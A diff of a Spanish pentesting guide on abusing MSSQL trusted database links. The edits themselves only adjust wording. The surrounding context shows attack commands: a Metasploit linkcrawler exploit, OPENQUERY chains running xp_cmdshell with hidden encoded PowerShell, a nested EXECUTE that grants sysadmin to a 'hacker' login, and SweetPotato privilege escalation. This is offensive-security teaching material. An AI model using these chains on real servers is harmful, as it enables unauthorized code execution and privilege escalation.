@@ -158,7 +158,7 @@ Revisa en la página mencionada en la **siguiente sección cómo hacerlo manualm
 
 ## Enlaces de Confianza en MSSQL
 
-Si una instancia de MSSQL es confiable (enlace de base de datos) por otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos confiable, podrá **utilizar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún momento el usuario podría encontrar alguna base de datos mal configurada donde pueda ejecutar comandos.
+Si una instancia de MSSQL es de confianza (enlace de base de datos) por otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos de confianza, podrá **utilizar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún momento el usuario podría encontrar alguna base de datos mal configurada donde pueda ejecutar comandos.
 
 **Los enlaces entre bases de datos funcionan incluso a través de confianzas de bosque.**
 
@@ -196,7 +196,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Puedes verificar fácilmente los enlaces de confianza utilizando metasploit.
+Puedes verificar fácilmente los enlaces de confianza usando metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -232,7 +232,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 
 ![](<../../images/image (643).png>)
 
-Puedes continuar esta cadena de enlaces de confianza para siempre de forma manual.
+Puede continuar esta cadena de enlaces de confianza para siempre de forma manual.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -254,7 +254,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 El **usuario local de MSSQL** generalmente tiene un tipo especial de privilegio llamado **`SeImpersonatePrivilege`**. Esto permite que la cuenta "imite a un cliente después de la autenticación".
 
-Una estrategia que muchos autores han ideado es forzar a un servicio del SYSTEM a autenticarse en un servicio malicioso o de intermediario que el atacante crea. Este servicio malicioso puede entonces imitar al servicio del SYSTEM mientras intenta autenticarse.
+Una estrategia que muchos autores han propuesto es forzar a un servicio del SISTEMA a autenticarse en un servicio malicioso o de intermediario que el atacante crea. Este servicio malicioso puede entonces imitar al servicio del SISTEMA mientras intenta autenticarse.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) tiene una colección de estas diversas técnicas que se pueden ejecutar a través del comando `execute-assembly` de Beacon.
 
